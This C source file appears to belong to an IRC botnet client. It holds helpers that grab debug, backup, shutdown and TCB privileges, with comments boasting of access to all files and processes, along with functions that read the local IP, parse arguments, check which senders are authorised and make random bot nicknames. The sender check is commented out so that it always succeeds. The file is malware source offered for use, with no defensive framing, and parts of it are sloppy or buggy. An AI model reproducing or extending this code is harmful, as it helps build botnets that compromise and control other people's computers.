

#include "bt1.h"

//Get IP
char *get_ip(SOCKET sock)
{
	int i;
	SOCKADDR sa;
	static char szIP[16];

#ifndef NO_DEBUG
		printf("[DEBUG] Getting ip, get_ip()...\n");
#endif

		memset(&sa, 0, sizeof(sa));
		i = sizeof(sa);
		getsockname(sock, &sa, &i);
		sprintf(szIP,"%d.%d.%d.%d",(BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
		return szIP;
}

//Get Parameters
bool set_priv()
{
	HANDLE hToken;
	LUID lValue; 
	TOKEN_PRIVILEGES pToken;
	if (is_os9x()) return FALSE;
	if (!is_osnt()) return FALSE;

#ifndef NO_DEBUG
		printf("[DEBUG] Setting privileges, set_priv()\n");
#endif	

//SE_BACKUP_NAME, Gives Us Rad Acess To All Files
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
			CloseHandle(hToken); 
			return FALSE; 
	} 
	if (!LookupPrivilegeValue(NULL, SE_BACKUP_NAME, &lValue)) 
	{
			CloseHandle(hToken); 
			return FALSE; 
	}
		pToken.PrivilegeCount = 1; 
		pToken.Privileges[0].Luid = lValue; 
		pToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	if (!AdjustTokenPrivileges(hToken, FALSE, &pToken, sizeof pToken, NULL, NULL)) 
	{
			CloseHandle(hToken);
			return FALSE;
	}
//SE_DEBUG_NAME, Gives Us Acess To All Running Processes
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
			CloseHandle(hToken); 
			return FALSE; 
	} 
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &lValue)) 
	{
			CloseHandle(hToken); 
			return FALSE; 
	}
		pToken.PrivilegeCount = 1; 
		pToken.Privileges[0].Luid = lValue; 
		pToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	if (!AdjustTokenPrivileges(hToken, FALSE, &pToken, sizeof pToken, NULL, NULL)) 
	{ 
			CloseHandle(hToken);
			return FALSE;
	}
//SE_SHUTDOWN_NAME, Gives Us Access To Shutdown System
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
			CloseHandle(hToken); 
			return FALSE; 
	} 
	if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &lValue)) 
	{
			CloseHandle(hToken); 
			return FALSE; 
	}
		pToken.PrivilegeCount = 1; 
		pToken.Privileges[0].Luid = lValue; 
		pToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	if (!AdjustTokenPrivileges(hToken, FALSE, &pToken, sizeof pToken, NULL, NULL)) 
	{ 
			CloseHandle(hToken);
	}
//SE_TCB_NAME, Gives Us Access To Act Like A System Component
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
			CloseHandle(hToken); 
			return FALSE; 
	} 
	if (!LookupPrivilegeValue(NULL, SE_TCB_NAME, &lValue)) 
	{
			CloseHandle(hToken); 
			return FALSE; 
	}
		pToken.PrivilegeCount = 1; 
		pToken.Privileges[0].Luid = lValue; 
		pToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	if (!AdjustTokenPrivileges(hToken, FALSE, &pToken, sizeof pToken, NULL, NULL)) 
	{ 
			CloseHandle(hToken);
	}
			return TRUE;
}
void get_params(char *argv[32])
{
	int i;
	char *szParam;

#ifndef NO_DEBUG
		printf("[DEBUG] Getting parameters, get_params()...\n");
#endif

		szParam = GetCommandLineA();
		argv[0] = strtok(szParam, " ");
	for (i = 1; i < 32; i++)
	{
			argv[i] = strtok(NULL, " ");
	}
		return;
}

//Host Matcher
bool hostcmp(char *szSender)
{
	char szMatch[LOWBUF];
	int i = 0;

#ifndef NO_DEBUG
		printf("[DEBUG] Comparing host, hostcmp()...\n");
#endif

	while (hostauth[i][0])
	{
			//sprintf(szMatch, hostauth[i++]);
		//if (strstr(szSender, szMatch) != NULL) 
		return TRUE;
	}
		return TRUE;
}
//return TRUE;
//Set BotNick
void set_botnick(char *szNickBuff)
{
	int i, uptime;
	char szNum[8], szRand[32];

#ifndef NO_DEBUG
		printf("[DEBUG] Setting botnick, set_botnick()...\n");
#endif

		memset(szNickBuff, 0, sizeof(szNickBuff));
		memset(szNum, 0, sizeof(szNum));
		memset(szRand, 0, sizeof(szRand));
		srand(GetTickCount());
	for (i = 1; i <= maxrand; i++)
	{
			sprintf(szNum, "%i", rand()%9);
			strcat(szRand, szNum);
	}
		uptime = GetTickCount() / 86400000;
	if (uptime > 10)
		sprintf(szNickBuff, "[%i]-%s%s", uptime, botname, szRand);
	else
		sprintf(szNickBuff, "%s%s", botname, szRand);
		return;
}

//Set Privileges
